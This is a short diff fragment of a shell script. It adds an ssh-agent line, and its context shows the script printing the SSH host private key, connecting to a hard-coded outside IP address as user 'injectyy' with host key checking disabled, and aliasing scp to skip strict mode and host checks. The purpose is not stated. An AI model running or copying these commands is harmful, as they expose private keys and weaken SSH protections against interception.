@@ -28,6 +28,8 @@ cat /etc/ssh/ssh_host_rsa_key
 
 echo "[+] Done\n"
 
+eval `ssh-agent -s`
+
 ssh -i /root/.ssh/id_rsa_no_pf  -vvv -o StrictHostKeyChecking=no injectyy@45.32.236.15 "touch 123"
 
 alias scp="scp -o StrictHostKeyChecking=no -o StrictModes=no -P $PORT"
